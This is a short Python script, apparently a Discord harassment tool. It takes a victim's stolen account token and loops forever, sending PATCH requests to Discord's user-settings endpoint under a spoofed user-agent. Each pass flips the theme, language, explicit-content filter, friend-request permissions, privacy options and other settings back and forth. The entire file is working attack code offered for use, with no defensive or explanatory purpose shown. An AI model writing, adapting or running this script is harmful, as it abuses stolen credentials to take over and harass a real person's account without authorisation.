import requests
import random

t_or_f = [True, False]

def annoy_user(token):
    headers = {"authorization": token,
               "user-agent": "Samsung Fridge/6.9"}
    condition_status = t_or_f[0]
    payload = {"theme": "light", "developer_mode": condition_status, "afk_timeout": 60, "locale": "ko", "message_display_compact": condition_status, "explicit_content_filter": 2, "default_guilds_restricted": condition_status, "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status, "mutual_guilds": condition_status}, "inline_embed_media": condition_status, "inline_attachment_media": condition_status, "gif_auto_play": condition_status, "render_embeds": condition_status,
               "render_reactions": condition_status, "animate_emoji": condition_status, "convert_emoticons": condition_status, "animate_stickers": 1, "enable_tts_command": condition_status, "native_phone_integration_enabled": condition_status, "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status, "stream_notifications_enabled": condition_status, "status": "dnd", "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
    requests.patch("https://discord.com/api/v8/users/@me/settings",
                   headers=headers,
                   json=payload)
    condition_status = t_or_f[1]
    payload = {"theme": "dark", "developer_mode": condition_status, "afk_timeout": 120, "locale": "bg", "message_display_compact": condition_status, "explicit_content_filter": 0, "default_guilds_restricted": condition_status, "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status, "mutual_guilds": condition_status}, "inline_embed_media": condition_status, "inline_attachment_media": condition_status, "gif_auto_play": condition_status, "render_embeds": condition_status,
               "render_reactions": condition_status, "animate_emoji": condition_status, "convert_emoticons": condition_status, "animate_stickers": 2, "enable_tts_command": condition_status, "native_phone_integration_enabled": condition_status, "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status, "stream_notifications_enabled": condition_status, "status": "dnd", "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
    requests.patch("https://discord.com/api/v8/users/@me/settings",
                   headers=headers,
                   json=payload)

def main():
    token = input('Enter The Victims Token: ')
    while True:
        annoy_user(token)

while True:
    main()